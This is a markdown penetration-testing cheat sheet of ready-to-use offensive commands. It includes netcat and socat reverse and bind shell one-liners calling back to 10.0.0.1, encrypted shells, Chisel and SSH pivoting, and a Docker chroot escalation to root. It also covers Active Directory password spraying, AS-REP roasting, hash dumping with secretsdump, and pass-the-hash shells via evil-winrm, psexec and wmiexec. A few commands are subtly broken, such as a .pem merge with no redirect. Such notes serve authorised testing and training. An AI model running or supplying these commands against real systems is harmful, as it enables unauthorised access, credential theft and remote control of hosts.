# Methodologies

## Summary
- [Enumerating services](#enumerating-services)
- [Netcat](#netcat)
  - [Setting up a listener](#setting-up-a-listener)
  - [Connecting to listening services](#connecting-to-listening-services)
  - [Send & receive files](#send--receive-files)
- [SecureCopy](#securecopy)
  - [Transfer remote files to local machine](#transfer-remote-files-to-local-machine)
  - [Transfer local files to remote machine](#transfer-local-files-to-remote-machine)
- [Socat](#socat)
  - [Setting up a stabilised listener](#setting-up-a-stabilised-listener)
  - [Connect to stabilised listener](#connect-to-stabilised-listener)
  - [Set up a standard listener](#set-up-a-standard-listener)
  - [Connect to a standard listener](#set-up-a-standard-listener)
  - [Set up encrypted reverse shell](#set-up-encrypted-reverse-shell)
  - [Set up encrypted bind shell](#set-up-encrypted-bind-shell)
- [TCPdump](#tcpdump)
  - [Useful options](#useful-options)
- [Docker](#docker)
  - [Useful options](#useful-options)
  - [Docker commands on local machine after port forwarding](#docker-commands-on-local-machine-after-port-forwarding)
  - [Escalate privilege to root](#escalate-privilege-to-root)
- [Utilising BorgBackup](#utilising-borgbackup)
  - [List all archives in the repo](#list-all-archives-in-the-repo)
  - [List the contents of archive](#list-the-contents-of-archive)
  - [Extract archive into local machine](#extract-archive-into-local-machine)
- [Pivoting within network](#pivoting-within-network)
  - [Remote port forwarding with Chisel](#remote-port-forwarding-with-chisel)
  - [Getting internet access on remote machine with Chisel](#getting-internet-access-on-remote-machine-with-chisel)
  - [Port forwarding with SSH](#port-forwarding-with-ssh)
  - [Port forwarding with Socat](#port-forwarding-with-socat)
- [Pentesting Active Directory](#pentesting-active-directory)
  - [Enumerate users](#enumerate-users)
  - [Enumerate using RPCClient](#enumerate-using-rpcclient)
  - [Dump password hashes](#dump-password-hashes)
  - [Windows remoting](#windows-remoting)
  - [Shell on remote machine](#shell-on-remote-machine)

## Enumerating services
```
nmap -p- -A --min-rate 10000 -oN [save file] 10.0.0.1
rustscan -u 5000 -a 'machine-ip' -- -sC -sV
rustscan -u 5000 -b 2250 -t 2000 -a 'ip' -- -A -oN scan.txt
nmap -T5 --open -sS -vvv --min-rate=300 --max-retries=3 -p- -oN all-ports-nmap-report 10.0.0.1
nmap --script firewall-bypass <target>
nmap --script firewall-bypass --script-args firewall-bypass.helper="ftp",firewall-bypass.targetport=21 <target>
nmap -n -sV --script="ldap* and not brute" -p 389 127.0.0.1 
nmap 10.0.0.1 -p139,445 --script=smb-vuln*
nmap --script=vuln -p 80 10.0.0.1
```

## Netcat
### Setting up a listener
```
nc -lvnp 4444
nc -e /bin/bash -lvnp 4444 --ssl
nc -e cmd.exe -lvnp 4444 --ssl
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -lvnp 4444 > /tmp/f
```

### Connecting to listening services
```
nc -e /bin/bash 10.0.0.1 4444 --ssl
nc -e cmd.exe 10.0.0.1 4444 --ssl
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4444 > /tmp/f
mkfifo /tmp/f;nc 10.0.0.1 4444 < /tmp/f|/bin/sh -i 2>&1;rm /tmp/f
```

### Send & receive files
```
nc -lvnp 4444 < file-name
nc -nv 10.0.0.1 4444 > file-name
```

## SecureCopy
### Transfer remote files to local machine
```
scp admin@10.0.0.1:<file_path> .
scp -P 4444 admin@10.0.0.1:<file_path> .
```

### Transfer local files to remote machine
```
scp <file_name> admin@10.0.0.1:[path][file name to save]
scp -P 4444 <file_name> admin@10.0.0.1:[path][file name to save]
```

## Socat
### Setting up a stabilised listener
`socat TCP-L:4444 FILE:`tty`,raw,echo=0`

### Connect to stabilised listener
`socat TCP:10.0.0.1:4444 EXEC:"bash -li",pty,stderr,sigint,setsid,sane`

### Set up a standard listener
```
socat TCP-L:4444 -
socat -d -d TCP4-LISTEN:4443 STDOUT
socat TCP-L:4444 EXEC:"bash -li"
socat -d -d TCP4-LISTEN:4443 EXEC:/bin/bash
socat TCP-L:4444 EXEC:powershell.exe,pipes
socat -d -d TCP4-LISTEN:4443 EXEC:'cmd.exe',pipes
```

### Connect to a standard listener
```
socat TCP:10.0.0.1:4444 EXEC:powershell.exe,pipes
socat TCP4:10.0.0.1:4443 EXEC:'cmd.exe',pipes
socat TCP:10.0.0.1:4444 EXEC:"bash -li"
socat TCP4:10.0.0.1:4443 EXEC:/bin/bash
socat TCP:10.0.0.1:4444 -
socat - TCP4:10.0.0.130:4443
```

### Set up encrypted reverse shell
*Generate a certificate*

`openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt`

*Merge the 2 created files into .pem extension*

`cat shell.key shell.crt shell.pem`

*Set up listener on local machine*
```
socat OPENSSL-LISTEN:4444,cert=shell.pem,verify=0
socat -d -d OPENSSL-LISTEN:4443,cert=bind.pem,verify=0,fork STDOUT
```

*Connect back to listener*
```
socat OPENSSL:10.0.0.1:4443,verify=0 EXEC:/bin/bash [LINUX]
socat OPENSSL:10.0.0.1:4443,verify=0 EXEC:'cmd.exe',pipes [WINDOWS]
```

### Set up encrypted bind shell
*Generate a certificate*
```
openssl req -newkey rsa:2048 -nodes -keyout bind.key -x509 -days 1000 -subj '/CN=www.mydom.com/O=My Company Name LTD./C=US' -out bind.crt`
```
*Merge the 2 created files into .pem file*

`cat bind.key bind.crt L bind.pem`

*Set up a listener on target machine*
```
socat OPENSSL-LISTEN:4443,cert=bind.pem,verify=0,fork EXEC:'cmd.exe',pipes [WINDOWS]
socat OPENSSL-LISTEN:4443,cert=bind.pem,verify=0,fork EXEC:/bin/bash [LINUX]
```

*Connect back to listener*
```
socat OPENSSL:10.0.0.1:4444,verify=0
socat - OPENSSL:10.0.0.130:4443,verify=0
```

## TCPdump
### Useful options
| Options | Description |
| ------- | ----------- |
| tcpdump -i any | Capture packets from any interfaces. "any" can be change accordingly to interfaces name. |
| tcpdump -i eth0 icmp | Capture packets of ICMP protocol from eth0 interface. |
| tcpdump port 80 | Capture packets coming from port 80(HTTP) from any interfaces. |
| tcpdump -D | Show available interfaces |
| tcpdump -i any -A | Print output in Ascii |
| tcpdump -i eth0 tcp/udp | Capture TCP/UDP packets only |
| tcpdump -i eth0 -c 10  | Capture first 10 packets only. |
| tcpdump -i any -w network.pcap | Save output to a file. |
| tcpdump host 192.168.1.100 | Capture packets from a specific host. |

## Docker
### Useful options
| Options | Description |
| ------- | ----------- |
| docker ps | List running containers |
| docker images | List all images |
| docker exec -it container-name /bin/sh | SSH into a container |
| docker restart container-name | Restart a container |

### Docker commands on local machine after port forwarding
| Options | Description |
| ------- | ----------- |
| docker -H tcp://localhost:8080 images | List all images |
| docker -H tcp://localhost:8080 container ls | List running containers |
| docker -H tcp://localhost:8080 exec-it image-name sh | Get shell on instances |

### Escalate privilege to root
`docker run -v /:/mnt --rm -it image chroot /mnt sh`

## Utilising BorgBackup
### List all archives in the repo
`--borg list directory-name`

### List the contents of archive
`--borg list directory-name::archive-name`

### Extract archive into local machine
`--borg extract directory-name::archive-name`

## Pivoting within network
### Remote port forwarding with Chisel
*Run on local machine*

`chisel server -p 8000 --reverse`

*Run on remote machine*

`chisel client 10.0.0.1:8000 R:{remote-port}:{target-ip}:{target-port}`

### Getting internet access on remote machine with Chisel
*Run on local machine*

`chisel server -p 8000`

*Run on remote machine*

`chisel client 10.0.0.1:8000 {remote-port}:{target-address}:{target-port}`

### Port forwarding with SSH
`ssh -L {remote-port}:{target-ip}:{target-port} username@10.0.0.1 -p 22`

### Port forwarding with Socat
*Set up a listener on remote machine*

`socat tcp-listen:4444,reuseaddr,fork tcp:{ip2forward}:{port2forward}`

*Connect to listener from local machine*

`socat TCP:10.0.0.1:4444 -`


## Pentesting Active Directory
### Enumerate users
```
kerbrute userenum -d domain.com rockyou.txt
kerbrute passwordspray -d domain.com users.txt Password123
kerbrute bruteuser -d domain.com rockyou.txt user1
impacket-lookupsid domain.com/guest@10.0.0.1
impacket-GetNPUsers -no-pass -usersfile userlist.txt -dc-ip 10.0.0.1 example.com/
```

### Enumerate using RPCClient
| Commands | Descriptions |
| -------- | ------------ |
| rpcclient -U "" 10.0.0.1 | Connect to AD |
| querydominfo | Domain information query |
| srvinfo | Server information |
| enumdomusers | Enumerate users |
| enumdomgroupd | Enumerate groups |
| querygroup 0x200 | Group queries |
| queryuser username | User queries |
| enumprivs | Enumerate privileges |
| getdompwinfo | Get domain password information |
| getusrdompwinfo 0x200 | Get user domain password |
| createdomuser username | Create domain user |
| setuserinfo2 username 24 password | Set a password for domain user |
| deletedomuser username | Delete domain user |
| enumalsgroups builtin | Enumerate alias groups |

### Dump password hashes
`impacket-secretsdump domain.com/username@10.0.0.1`

### Windows remoting
`crackmapexec winrm 10.0.0.1 -u username -p password`

### Shell on remote machine
```
impacket-psexec domain.com/username@10.0.0.1
impacket-wmiexec domain.com/username@10.0.0.1
evil-winrm -i 10.0.0.1 -u username -p password
evil-winrm -i 10.0.0.1 -u administrator -H "hash"                           1 ⨯
impacket-wmiexec domain.com/admin@10.0.0.1 -hashes [hash]
```